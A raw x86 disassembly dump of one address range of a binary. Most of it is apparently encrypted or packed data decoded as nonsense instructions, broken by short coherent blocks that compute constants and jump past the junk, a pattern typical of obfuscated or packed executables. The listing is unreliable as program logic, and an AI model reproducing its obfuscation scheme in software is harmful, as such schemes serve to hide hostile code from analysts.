  40e1b5:	lods   eax,DWORD PTR ds:[esi]
  40e1b6:	add    DWORD PTR [ebx-0x1319f26b],edi
  40e1bc:	add    BYTE PTR [ebx],ch
  40e1be:	dec    ebx
  40e1bf:	retf   
  40e1c0:	daa    
  40e1c1:	out    dx,eax
  40e1c2:	jo     0x40e1ce
  40e1c4:	in     al,0xe6
  40e1c6:	inc    ebp
  40e1c7:	xchg   DWORD PTR [ecx],esp
  40e1c9:	mov    ?,WORD PTR [edx]
  40e1cb:	repnz cmp ah,0xbc
  40e1cf:	pop    ds
  40e1d0:	dec    esp
  40e1d1:	jecxz  0x40e245
  40e1d3:	in     eax,0xe2
  40e1d5:	loopne 0x40e1d6
  40e1d7:	mov    eax,0xf5b09b29
  40e1dc:	push   cs
  40e1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1de:	mov    eax,ds:0x8f6b53d4
  40e1e3:	dec    ebx
  40e1e4:	out    dx,eax
  40e1e5:	jmp    0x40e25c
  40e1e7:	int    0x2
  40e1e9:	push   edi
  40e1ea:	push   ebp
  40e1eb:	cdq    
  40e1ec:	mov    cl,0x7
  40e1ee:	mov    ds:0x900727dd,al
  40e1f3:	push   0xb97ad36a
  40e1f8:	fldcw  WORD PTR [ebp+0x4c4a960b]
  40e1fe:	ins    BYTE PTR es:[edi],dx
  40e1ff:	(bad)  
  40e200:	adc    ebx,DWORD PTR [esp]
  40e203:	lea    ebx,[edi]
  40e205:	xchg   ebp,eax
  40e206:	xchg   ebp,eax
  40e207:	cmp    ecx,DWORD PTR [edi-0x6c4a34ed]
  40e20d:	nop
  40e20e:	mov    ds:0x972b8379,eax
  40e213:	inc    esi
  40e214:	dec    ecx
  40e215:	(bad)  
  40e216:	dec    esp
  40e217:	clc    
  40e218:	dec    edi
  40e219:	cmp    eax,edx
  40e21b:	cwde   
  40e21c:	out    0x38,al
  40e21e:	div    dl
  40e220:	ds or  al,dl
  40e223:	retf   0xfb30
  40e226:	adc    eax,0xe5ecb113
  40e22b:	sub    edx,DWORD PTR [eax+0x59]
  40e22e:	and    DWORD PTR [esi+0x5cc4c631],esi
  40e234:	fisubr WORD PTR [esi+eiz*8-0x131b605e]
  40e23b:	sub    BYTE PTR [ebx+0x41cf4805],cl
  40e241:	pop    ebp
  40e242:	mov    ah,0x81
  40e244:	retf   
  40e245:	mov    ebp,DWORD PTR [eax-0x6a]
  40e248:	pop    eax
  40e249:	xchg   DWORD PTR [esi-0x2af6cb98],ecx
  40e24f:	into   
  40e250:	in     eax,0x4f
  40e252:	add    DWORD PTR [ecx+0x21ce3ebf],esi
  40e258:	int    0xab
  40e25a:	repnz cwde 
  40e25c:	pop    edi
  40e25d:	jl     0x40e24f
  40e25f:	(bad)  
  40e260:	call   0x60eada36
  40e265:	popf   
  40e266:	aam    0x59
  40e268:	jae    0x40e228
  40e26a:	pushf  
  40e26b:	retf   
  40e26c:	fcmovnb st,st(6)
  40e26e:	mov    ds:0x4b2bfd90,al
  40e273:	mov    eax,ds:0xc427f5f7
  40e278:	es cmp al,0x5e
  40e27b:	sub    bh,cl
  40e27d:	mov    bl,0x6e
  40e27f:	ins    BYTE PTR es:[edi],dx
  40e280:	pop    ss
  40e281:	(bad)  
  40e282:	into   
  40e283:	(bad)  
  40e284:	mov    esi,0x6ce1d3e
  40e289:	aaa    
  40e28a:	mov    ebx,DWORD PTR [edx+0xb]
  40e28d:	aas    
  40e28e:	ret    0x3e78
  40e291:	cmp    bh,BYTE PTR [eax+ecx*8]
  40e294:	rcr    BYTE PTR [esi-0x66d7aaad],cl
  40e29a:	stos   DWORD PTR es:[edi],eax
  40e29b:	inc    edi
  40e29c:	push   edx
  40e29d:	jno    0x40e2dd
  40e29f:	(bad)  
  40e2a0:	test   edi,0x5e68ae61
  40e2a6:	push   0xcb6d3fff
  40e2ab:	jne    0x40e23d
  40e2ad:	adc    BYTE PTR [ecx],ch
  40e2af:	les    edi,FWORD PTR [edi-0x1b]
  40e2b2:	pop    ebp
  40e2b3:	faddp  st(6),st
  40e2b5:	push   ds
  40e2b6:	adc    eax,0xf429213f
  40e2bb:	mov    dl,0x0
  40e2bd:	out    0xf3,al
  40e2bf:	outs   dx,DWORD PTR ds:[esi]
  40e2c0:	xchg   edi,eax
  40e2c1:	pop    ecx
  40e2c2:	ret    
  40e2c3:	fisubr DWORD PTR [ebx+eax*8-0x1e]
  40e2c7:	lods   eax,DWORD PTR ds:[esi]
  40e2c8:	xchg   ah,al
  40e2ca:	lds    esi,FWORD PTR [edi]
  40e2cc:	test   eax,0x76b3d25
  40e2d1:	add    esp,ebx
  40e2d3:	jp     0x40e330
  40e2d5:	jmp    0x1ead0a08
  40e2da:	mov    WORD PTR [esi+0x79],?
  40e2dd:	stos   BYTE PTR es:[edi],al
  40e2de:	cdq    
  40e2df:	repnz rcr DWORD PTR [esi+0x417c18d],cl
  40e2e6:	pop    es
  40e2e7:	jne    0x40e2cb
  40e2e9:	or     bh,BYTE PTR [eax+0x795c9922]
  40e2ef:	aad    0xbd
  40e2f1:	xlat   BYTE PTR ds:[ebx]
  40e2f2:	mov    cl,0xb
  40e2f4:	push   esp
  40e2f5:	bound  ecx,QWORD PTR [ebp-0x3b]
  40e2f8:	pop    esi
  40e2f9:	(bad)  
  40e2fa:	xor    BYTE PTR [esi],dl
  40e2fc:	pop    esi
  40e2fd:	jp     0x40e305
  40e2ff:	push   esi
  40e300:	jno    0x40e2a8
  40e302:	xchg   ebx,eax
  40e303:	mov    cl,0xe2
  40e305:	or     BYTE PTR [eax+0xc5a8351],dl
  40e30b:	fldenv [edx]
  40e30d:	sbb    al,0xf7
  40e30f:	mov    esi,eax
  40e311:	test   al,0xd5
  40e313:	jb     0x40e37d
  40e315:	sub    al,0xa1
  40e317:	(bad)  
  40e318:	arpl   WORD PTR [eax],bp
  40e31a:	jno    0x40e313
  40e31c:	jmp    0x40e2e2
  40e31e:	ss xchg ebp,eax
  40e320:	xchg   esi,eax
  40e321:	das    
  40e322:	adc    eax,DWORD PTR [ecx+edx*8+0x489e3edf]
  40e329:	push   0x913b40cf
  40e32e:	aas    
  40e32f:	or     eax,0xbb521421
  40e334:	mov    cl,0xd7
  40e336:	outs   dx,DWORD PTR ds:[esi]
  40e337:	mov    dl,0xc6
  40e339:	xor    al,0x42
  40e33b:	jl     0x40e2c3
  40e33d:	mov    ebx,0x8fe27929
  40e342:	pop    es
  40e343:	and    eax,0xff849c00
  40e348:	test   al,0x3
  40e34a:	push   ds
  40e34b:	push   ds
  40e34c:	jo     0x40e3c0
  40e34e:	inc    edx
  40e34f:	jl     0x40e331
  40e351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e352:	call   0xaf4026c8
  40e357:	cmp    eax,0xe86ba1b3
  40e35c:	mov    bh,0x81
  40e35e:	(bad)  
  40e35f:	in     eax,0x5b
  40e361:	xor    DWORD PTR [ebp-0x23],ebx
  40e364:	clc    
  40e365:	mov    dh,0xfb
  40e367:	xchg   ebx,eax
  40e368:	dec    edi
  40e369:	push   edi
  40e36a:	push   0xffffff89
  40e36c:	and    DWORD PTR [ecx+0x13],edi
  40e36f:	ror    DWORD PTR [edi],0x10
  40e372:	popa   
  40e373:	mov    ecx,0x3486d0f0
  40e378:	inc    bh
  40e37a:	iret   
  40e37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e37c:	or     BYTE PTR [edi],ah
  40e37e:	leave  
  40e37f:	xor    al,0xc1
  40e381:	and    esi,DWORD PTR [edx-0xea8e0cf]
  40e387:	sub    DWORD PTR [ecx],edi
  40e389:	xor    ebx,eax
  40e38b:	adc    esp,DWORD PTR [ebx-0x21]
  40e38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e38f:	inc    esp
  40e390:	sub    ch,0x6a
  40e393:	aam    0x4b
  40e395:	ror    cl,1
  40e397:	adc    eax,0x53fcd771
  40e39c:	mov    dl,0x28
  40e39e:	nop
  40e39f:	or     edi,DWORD PTR [eax]
  40e3a1:	mov    ah,0xe6
  40e3a3:	xor    DWORD PTR [ebx-0x36],edi
  40e3a6:	jbe    0x40e351
  40e3a8:	in     al,dx
  40e3a9:	mov    ch,0x29
  40e3ab:	and    eax,0xec02b43b
  40e3b0:	dec    esi
  40e3b1:	jge    0x40e3ba
  40e3b3:	outs   dx,DWORD PTR ds:[esi]
  40e3b4:	or     eax,0x2799a222
  40e3b9:	rcl    BYTE PTR [edi+0x7f],0xca
  40e3bd:	xchg   dl,ah
  40e3bf:	imul   edi,ebx,0x7b9f0f0d
  40e3c5:	push   ecx
  40e3c6:	xchg   esp,eax
  40e3c7:	mov    DWORD PTR [ecx],ebx
  40e3c9:	fiadd  WORD PTR [edi-0x15]
  40e3cc:	mov    edi,0x212288eb
  40e3d1:	mov    dh,0x88
  40e3d3:	js     0x40e398
  40e3d5:	aam    0xc0
  40e3d7:	in     al,0x4e
  40e3d9:	dec    ebx
  40e3da:	int3   
  40e3db:	xchg   BYTE PTR [ecx],ah
  40e3dd:	outs   dx,BYTE PTR ds:[esi]
  40e3de:	xor    ch,BYTE PTR [eax+0x1ba05f2b]
  40e3e4:	mov    ebx,0xca9e24c9
  40e3e9:	vxorpd ymm6,ymm3,YMMWORD PTR [ebp+ebx*1+0x16]
  40e3ef:	jg     0x40e39a
  40e3f1:	stc    
  40e3f2:	mov    edi,0xa4873a7c
  40e3f7:	std    
  40e3f8:	fdivr  QWORD PTR [ebp+0x1c822f05]
  40e3fe:	dec    esp
  40e3ff:	jnp    0x40e3f7
  40e401:	fwait
  40e402:	adc    bh,BYTE PTR [edi-0x4b]
  40e405:	push   esp
  40e406:	mov    BYTE PTR [ebx+0x1af9a3d2],ch
  40e40c:	ja     0x40e475
  40e40e:	outs   dx,BYTE PTR ds:[esi]
  40e40f:	dec    ebp
  40e410:	aad    0x95
  40e412:	call   ebp
  40e414:	aam    0xf2
  40e416:	mov    ecx,0xf35cc526
  40e41b:	xor    dh,ah
  40e41d:	or     ch,BYTE PTR [ebx]
  40e41f:	ret    
  40e420:	push   eax
  40e421:	pop    edx
  40e422:	push   cs
  40e423:	dec    eax
  40e424:	rcl    BYTE PTR [edi+0xf],cl
  40e427:	addr16 addr16 jne 0x40e420
  40e42b:	sub    ah,bh
  40e42d:	xor    DWORD PTR [edx],esi
  40e42f:	aas    
  40e430:	push   ecx
  40e431:	inc    esp
  40e432:	and    cl,BYTE PTR [ebx]
  40e434:	mov    dl,0xc7
  40e436:	shl    BYTE PTR [esi],cl
  40e438:	mov    ecx,0xf3032d51
  40e43d:	mov    ebx,esi
  40e43f:	ror    BYTE PTR [eax+0x4235d5d7],cl
  40e445:	fs push ecx
  40e447:	frndint 
  40e449:	mov    ch,0xd7
  40e44b:	xor    edx,edx
  40e44d:	and    eax,0x6d33
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax-0x551ceaef],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [eax+0x6e2949f1],ah
  40e4ef:	dec    esi
  40e4f0:	and    al,0xc2
  40e4f2:	retf   0xbff0
  40e4f5:	pop    ebp
  40e4f6:	sbb    al,0xe8
  40e4f8:	or     al,0xa
  40e4fa:	xchg   edx,eax
  40e4fb:	mov    eax,eax
  40e4fd:	xor    BYTE PTR [esi+0x22658e6f],ch
  40e503:	sbb    BYTE PTR [ebx+ebp*1],al
  40e506:	mov    ah,0x19
  40e508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e509:	popf   
  40e50a:	(bad)  
  40e50b:	jmp    0x62ca896b
  40e510:	mov    eax,0xa0da154a
  40e515:	xlat   BYTE PTR ds:[ebx]
  40e516:	or     al,BYTE PTR [esi-0x7]
  40e519:	cwde   
  40e51a:	add    al,0xbd
  40e51c:	enter  0xf7cc,0x7a
  40e520:	scas   al,BYTE PTR es:[edi]
  40e521:	repz inc ebp
  40e523:	dec    eax
  40e524:	sar    al,cl
  40e526:	retf   
  40e527:	aam    0x53
  40e529:	unpcklps xmm2,xmm4
  40e52c:	jl     0x40e4bf
  40e52e:	or     al,0x74
  40e530:	sti    
  40e531:	jo     0x40e57b
  40e533:	cmc    
  40e534:	in     al,0xe2
  40e536:	retf   
  40e537:	retf   
  40e538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e539:	xchg   ebx,eax
  40e53a:	mov    bl,0x22
  40e53c:	add    al,0x8a
  40e53e:	mov    fs,WORD PTR [edx]
  40e540:	cmc    
  40e541:	mov    ds:0x7a7234a8,eax
  40e546:	adc    al,0x5a
  40e548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e549:	scas   al,BYTE PTR es:[edi]
  40e54a:	dec    ecx
  40e54b:	stos   DWORD PTR es:[edi],eax
  40e54c:	push   cs
  40e54d:	ret    
  40e54e:	sar    BYTE PTR ds:0xa1a12648,0x69
  40e555:	fld    QWORD PTR [eax-0x928c973]
  40e55b:	xchg   edi,eax
  40e55c:	loopne 0x40e533
  40e55e:	shr    BYTE PTR [esi-0x5b],1
  40e561:	popa   
  40e562:	fmul   DWORD PTR [esi]
  40e564:	mov    edx,0x838f6cb2
  40e569:	jae    0x40e576
  40e56b:	sahf   
  40e56c:	add    DWORD PTR [eax+ebx*1+0x7665953a],0xe860d4c2
  40e577:	pop    edx
  40e578:	mov    BYTE PTR [ebx],al
  40e57a:	mov    edi,DWORD PTR [esi]
  40e57c:	cs scas al,BYTE PTR es:[edi]
  40e57e:	xchg   ecx,eax
  40e57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e580:	cwde   
  40e581:	scas   eax,DWORD PTR es:[edi]
  40e582:	add    DWORD PTR [esi+0x28],ecx
  40e585:	and    BYTE PTR [edi],al
  40e587:	imul   eax,DWORD PTR [eax+0x57],0x5a111223
  40e58e:	mov    eax,ds:0x6aa6b39b
  40e593:	adc    al,0xc3
  40e595:	aaa    
  40e596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e597:	jmp    0x71ed:0x47b9f892
  40e59e:	je     0x40e5a8
  40e5a0:	inc    DWORD PTR [esi]
  40e5a2:	fidivr WORD PTR [ecx+0x31]
  40e5a5:	jns    0x40e56a
  40e5a7:	jb     0x40e5cc
  40e5a9:	ss out 0x59,al
  40e5ac:	add    eax,0x979f6cf5
  40e5b1:	(bad)  
  40e5b2:	mov    ebp,0x9eb5407b
  40e5b7:	and    dl,al
  40e5b9:	push   esp
  40e5ba:	pushf  
  40e5bb:	std    
  40e5bc:	sub    dh,BYTE PTR [ecx-0x7247096c]
  40e5c2:	xchg   ebx,eax
  40e5c3:	xchg   ebx,eax
  40e5c4:	cdq    
  40e5c5:	cld    
  40e5c6:	out    0xb0,eax
  40e5c8:	add    bl,al
  40e5ca:	je     0x40e589
  40e5cc:	outs   dx,BYTE PTR ds:[esi]
  40e5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ce:	test   al,0x73
  40e5d0:	fwait
  40e5d1:	or     BYTE PTR [ebx],0xc4
  40e5d4:	xchg   BYTE PTR [edx],al
  40e5d6:	mov    bl,0x46
  40e5d8:	das    
  40e5d9:	mov    ebp,0xf56c524a
  40e5de:	adc    ah,dh
  40e5e0:	cmp    BYTE PTR [edi+ecx*8-0x5f],al
  40e5e4:	mov    ebx,0x202f7aba
  40e5e9:	test   BYTE PTR fs:[ecx+0x865a71d],0x4
  40e5f1:	and    esi,DWORD PTR [ebp+0x5426905f]
  40e5f7:	mov    ebp,0xeb45804f
  40e5fc:	mov    esi,0x4b522a44
  40e601:	inc    esi
  40e602:	mov    ds:0x1abe887a,eax
  40e607:	sub    esp,DWORD PTR [edi]
  40e609:	mov    ds,WORD PTR [edx-0x5e]
  40e60c:	sub    al,0x8
  40e60e:	mov    al,0xc1
  40e610:	dec    DWORD PTR [ebx+0x68092b06]
  40e616:	(bad)  
  40e617:	adc    dh,BYTE PTR [eax]
  40e619:	jmp    0x8160:0xe21877d3
  40e620:	xor    al,0xaa
  40e622:	(bad)  
  40e623:	adc    al,0x1f
  40e625:	iret   
  40e626:	dec    edx
  40e627:	leave  
  40e628:	jge    0x40e679
  40e62a:	mov    esi,0x269ea329
  40e62f:	in     al,dx
  40e630:	daa    
  40e631:	mov    WORD PTR [edi],?
  40e633:	sbb    bl,BYTE PTR [ecx]
  40e635:	xchg   ebp,eax
  40e636:	std    
  40e637:	mov    ecx,0x4b171b54
  40e63c:	push   ds
  40e63d:	int    0x6f
  40e63f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e640:	cmp    dl,ah
  40e642:	and    BYTE PTR [edi+eax*4],bh
  40e645:	lahf   
  40e646:	cmp    edx,DWORD PTR [eax]
  40e648:	add    DWORD PTR [eax-0x3f],ecx
  40e64b:	and    eax,0xb5f123d
  40e650:	sti    
  40e651:	cmp    ah,BYTE PTR [edx+0x48f01e39]
  40e657:	xchg   edi,eax
  40e658:	cmp    ebp,0xffffffcd
  40e65b:	ret    0x3cba
  40e65e:	call   0x540:0x608ac2f3
  40e665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e666:	mov    ebp,0xf6a07af6
  40e66b:	mov    al,0xfd
  40e66d:	fwait
  40e66e:	add    DWORD PTR [edi+0x4791a491],esi
  40e674:	(bad)  
  40e675:	fist   DWORD PTR [edi+esi*1-0x77]
  40e679:	(bad)  
  40e67a:	jmp    0x40e65e
  40e67c:	test   BYTE PTR ds:0xa5b663ff,ah
  40e682:	cmp    DWORD PTR ds:0x1aafe8c8,ecx
  40e688:	inc    edi
  40e689:	stos   DWORD PTR es:[edi],eax
  40e68a:	cdq    
  40e68b:	xchg   edx,eax
  40e68c:	inc    esi
  40e68d:	xchg   edx,eax
  40e68e:	inc    ebp
  40e68f:	add    DWORD PTR [edi-0x514d336a],esi
  40e695:	pop    esi
  40e696:	sub    DWORD PTR [edx],eax
  40e698:	fld    QWORD PTR [ebp+0x7e]
  40e69b:	xchg   edx,eax
  40e69c:	xchg   esi,eax
  40e69d:	fcmovbe st,st(7)
  40e69f:	sub    DWORD PTR [edi],eax
  40e6a1:	dec    esi
  40e6a2:	dec    ecx
  40e6a3:	ror    BYTE PTR [ebx-0x1a],1
  40e6a6:	push   eax
  40e6a7:	sbb    BYTE PTR [ebp+eax*2+0x6bbe4b90],cl
  40e6ae:	dec    ebp
  40e6af:	(bad)  
  40e6b0:	aas    
  40e6b1:	cmp    eax,0x4327c03a
  40e6b6:	ror    ah,1
  40e6b8:	dec    edi
  40e6b9:	scas   eax,DWORD PTR es:[edi]
  40e6ba:	dec    edx
  40e6bb:	mov    ds:0xc85bf65e,eax
  40e6c0:	mov    ds:0x7d3e8200,eax
  40e6c5:	gs inc ebp
  40e6c7:	fisttp WORD PTR [esi-0xd3ea594]
  40e6cd:	aas    
  40e6ce:	push   edx
  40e6cf:	cmp    BYTE PTR [edi-0x5c],al
  40e6d2:	or     eax,0x62491c32
  40e6d7:	scas   al,BYTE PTR es:[edi]
  40e6d8:	cli    
  40e6d9:	xchg   ebx,eax
  40e6da:	xor    eax,0xf1be8d47
  40e6df:	leave  
  40e6e0:	adc    DWORD PTR [ecx-0x4e],esp
  40e6e3:	xchg   esi,eax
  40e6e4:	aad    0x66
  40e6e6:	sub    al,0xd7
  40e6e8:	push   eax
  40e6e9:	bound  edx,QWORD PTR [edx-0x1c30af66]
  40e6ef:	ret    0x3ef5
  40e6f2:	fld    st(1)
  40e6f4:	in     eax,dx
  40e6f5:	bound  edi,QWORD PTR [eax]
  40e6f7:	sbb    bl,BYTE PTR [ebp+0x7a]
  40e6fa:	add    al,0xd
  40e6fc:	aam    0x11
  40e6fe:	dec    esi
  40e6ff:	add    al,0x3b
  40e701:	imul   ebx,DWORD PTR [eax+ebp*8],0x19
  40e705:	add    al,0x2a
  40e707:	ffree  st(6)
  40e709:	xchg   ebp,eax
  40e70a:	inc    eax
  40e70b:	push   eax
  40e70c:	cmp    al,BYTE PTR [eax]
  40e70e:	outs   dx,BYTE PTR ds:[esi]
  40e70f:	or     al,0x7a
  40e711:	ffreep st(7)
  40e713:	jae    0x40e78d
  40e715:	pop    ss
  40e716:	mov    ah,BYTE PTR [esi-0x41a7cf10]
  40e71c:	mov    ebp,0xdce02c1f
  40e721:	lahf   
  40e722:	in     eax,dx
  40e723:	adc    esp,0x31caef16
  40e729:	ret    0x8784
  40e72c:	cmova  esi,ebx
  40e72f:	mov    al,ds:0x3921c1ea
  40e734:	popa   
  40e735:	ja     0x40e734
  40e737:	imul   edx,DWORD PTR [edi],0x15f1f4a5
  40e73d:	int    0x7b
  40e73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e740:	sub    eax,0x3d697e78
  40e745:	cwde   
  40e746:	xor    eax,0xbd66f9eb
  40e74b:	(bad)  
  40e74c:	mov    esi,0xda478139
  40e751:	inc    esp
  40e752:	jge    0x40e79a
  40e754:	and    eax,0x814a6bec
  40e759:	out    0x79,eax
  40e75b:	sbb    eax,0x4ad0c6b3
  40e760:	xchg   DWORD PTR [eax],ecx
  40e762:	lods   eax,DWORD PTR ds:[esi]
  40e763:	and    BYTE PTR [eax-0x1a],0x7d
  40e767:	fmulp  st(5),st
  40e769:	jae    0x40e776
  40e76b:	ret    
  40e76c:	add    DWORD PTR [ebx],edx
  40e76e:	into   
  40e76f:	mov    al,ds:0x78a51426
  40e774:	(bad)  
  40e775:	push   ebx
  40e776:	lahf   
  40e777:	clc    
  40e778:	cmp    DWORD PTR [edi],edi
  40e77a:	pop    eax
  40e77b:	(bad)  
  40e77c:	push   ebx
  40e77d:	jp     0x40e7c5
  40e77f:	push   ebx
  40e780:	jne    0x40e707
  40e782:	pop    esp
  40e783:	cdq    
  40e784:	pop    ss
  40e785:	cmp    eax,0x5aaa2ea3
  40e78a:	jmp    0xde7655b8
  40e78f:	fidiv  WORD PTR [edx]
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	shl    DWORD PTR [eax-0x41bd4399],0x18
  40e7f6:	sbb    dl,dl
  40e7f8:	adc    al,0x18
  40e7fa:	sbb    cl,ah
  40e7fc:	cmp    eax,0x8ccedf59
  40e801:	adc    dl,BYTE PTR [esi+esi*4]
  40e804:	ja     0x40e7df
  40e806:	mov    bh,0x74
  40e808:	mov    edi,0x882e4bb3
  40e80d:	push   cs
  40e80e:	dec    ebp
  40e80f:	xchg   esp,ebp
  40e811:	and    BYTE PTR [ebp+0x19f865ab],0x5a
  40e818:	sahf   
  40e819:	dec    ebx
  40e81a:	arpl   WORD PTR [esi],di
  40e81c:	das    
  40e81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e81e:	and    edi,DWORD PTR [ecx+0x38]
  40e821:	cmp    eax,DWORD PTR [ecx]
  40e823:	push   edi
  40e824:	mov    ss:0x5b009b41,al
  40e82a:	es mov ah,0x43
  40e82d:	or     ah,bl
  40e82f:	hlt    
  40e830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e831:	lahf   
  40e832:	adc    dh,cl
  40e834:	fimul  WORD PTR [edx]
  40e836:	pop    ebx
  40e837:	jns    0x40e866
  40e839:	scas   eax,DWORD PTR es:[edi]
  40e83a:	pushf  
  40e83b:	(bad)  
  40e83c:	push   ebx
  40e83d:	adc    ebp,DWORD PTR [esp+ebx*8]
  40e840:	push   esp
  40e841:	mov    eax,ds:0xb61cf50d
  40e846:	sub    ecx,DWORD PTR [edi+esi*1+0x56]
  40e84a:	enter  0x87b5,0xb7
  40e84e:	out    dx,eax
  40e84f:	jg     0x40e85a
  40e851:	sbb    bh,BYTE PTR [eax-0x3]
  40e854:	sub    cl,BYTE PTR [esi+0x60]
  40e857:	ficomp WORD PTR [eax+edx*2-0x5e]
  40e85b:	jo     0x40e839
  40e85d:	lods   al,BYTE PTR ds:[esi]
  40e85e:	push   ecx
  40e85f:	or     DWORD PTR [ebp+0xeaabbf9],esi
  40e865:	(bad)  
  40e866:	in     eax,dx
  40e867:	push   ss
  40e868:	mov    ah,0x7a
  40e86a:	or     al,0x4f
  40e86c:	fistp  DWORD PTR [esi]
  40e86e:	adc    ah,BYTE PTR [ecx]
  40e870:	jae    0x40e820
  40e872:	jb     0x40e886
  40e874:	inc    edx
  40e875:	jge    0x40e8f3
  40e877:	xchg   edx,eax
  40e878:	inc    edi
  40e879:	aaa    
  40e87a:	aas    
  40e87b:	xor    eax,0xa4f4d55d
  40e880:	sar    DWORD PTR [edx-0x56],0x9d
  40e884:	mov    ah,BYTE PTR [esi-0x5e]
  40e887:	dec    ebx
  40e888:	bound  esi,QWORD PTR [edi]
  40e88a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e88b:	sti    
  40e88c:	adc    al,0x3c
  40e88e:	sbb    esp,DWORD PTR [edi-0x587cef59]
  40e894:	dec    edx
  40e895:	mov    ebp,fs
  40e897:	test   dl,dl
  40e899:	dec    ebp
  40e89a:	cs mov cl,0xe4
  40e89d:	arpl   WORD PTR [edi+eiz*4],bp
  40e8a0:	test   eax,0x3f21c2d0
  40e8a5:	inc    ebp
  40e8a6:	sub    eax,0xe5a2f064
  40e8ab:	and    dl,BYTE PTR [eax-0x63]
  40e8ae:	xchg   dl,al
  40e8b0:	sbb    eax,0xf82599de
  40e8b5:	push   edi
  40e8b6:	aad    0x44
  40e8b8:	pop    ebp
  40e8b9:	inc    edi
  40e8ba:	test   DWORD PTR [edi],esp
  40e8bc:	bound  edi,QWORD PTR [ecx+0x61687047]
  40e8c2:	int    0x8f
  40e8c4:	or     BYTE PTR [esi-0x4ff7ec9c],0xae
  40e8cb:	mov    esi,DWORD PTR [ebx+0x227883cc]
  40e8d1:	cmp    esi,edi
  40e8d3:	adc    DWORD PTR [ecx-0x35244717],esi
  40e8d9:	or     DWORD PTR [ebx+0x7c],edx
  40e8dc:	jne    0x40e91e
  40e8de:	(bad)  
  40e8df:	cmp    eax,0x70e2a2ba
  40e8e4:	jae    0x40e939
  40e8e6:	mov    ecx,0x8e51822a
  40e8eb:	add    eax,0x3c30c5be
  40e8f0:	mov    eax,0x9448254d
  40e8f5:	popa   
  40e8f6:	mov    ecx,0xa22505e
  40e8fb:	xchg   esp,eax
  40e8fc:	xchg   esp,eax
  40e8fd:	xchg   edi,eax
  40e8fe:	xchg   DWORD PTR [ecx+0x505473c0],ebp
  40e904:	push   0x9c3363ef
  40e909:	jo     0x40e8d3
  40e90b:	data16 aaa 
  40e90d:	xchg   esp,eax
  40e90e:	sbb    DWORD PTR [edx+0x33],ebx
  40e911:	iret   
  40e912:	aam    0x7e
  40e914:	das    
  40e915:	adc    DWORD PTR [ecx+eiz*4+0x56c0187b],eax
  40e91c:	call   0xd50e7510
  40e921:	and    DWORD PTR ds:0x31d674ea,0xffffffe1
  40e928:	loopne 0x40e906
  40e92a:	cs xchg ebp,eax
  40e92c:	jbe    0x40e9ac
  40e92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e92f:	retf   0xbaca
  40e932:	jge    0x40e924
